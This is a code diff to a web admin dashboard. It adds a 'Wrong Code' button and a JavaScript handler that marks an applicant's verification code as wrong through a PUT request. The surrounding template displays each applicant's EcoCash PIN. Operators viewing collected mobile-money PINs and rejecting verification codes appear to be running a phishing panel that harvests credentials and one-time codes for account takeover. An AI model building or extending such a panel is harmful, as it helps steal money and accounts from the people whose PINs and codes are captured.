@@ -475,6 +475,14 @@ ${app.ecocash_pin
                 </button>
 
                 <button
+    class="wrongCodeBtn"
+    data-id="${app.id}">
+
+    ❌ Wrong Code
+
+</button>
+
+                <button
                     class="assessmentBtn"
                     data-id="${app.id}">
 
@@ -1226,6 +1234,75 @@ async function checkForNewApplications() {
     }
 
 }
+
+// ======================================================
+// MARK VERIFICATION CODE AS WRONG
+// ======================================================
+
+document.addEventListener("click", async (e) => {
+
+    const button =
+        e.target.closest(".wrongCodeBtn");
+
+    if (!button) return;
+
+    const id =
+        button.dataset.id;
+
+    const confirmed = confirm(
+        "Mark this verification code as WRONG?"
+    );
+
+    if (!confirmed) return;
+
+    try {
+
+        button.disabled = true;
+
+        const response =
+            await fetch(
+                `/wrong-code/${id}`,
+                {
+                    method: "PUT"
+                }
+            );
+
+        const result =
+            await response.json();
+
+        if (!response.ok || !result.success) {
+
+            throw new Error(
+                result.message ||
+                result.error ||
+                "Unable to mark code as wrong."
+            );
+
+        }
+
+        console.log(
+            "Wrong code recorded:",
+            result.application
+        );
+
+        await loadApplications();
+
+    } catch (error) {
+
+        console.error(
+            "WRONG CODE ERROR:",
+            error
+        );
+
+        alert(
+            "Unable to mark the code as wrong."
+        );
+
+        button.disabled = false;
+
+    }
+
+});
 
 // ===============================
 // PART 12 - FINAL SAFETY CHECK
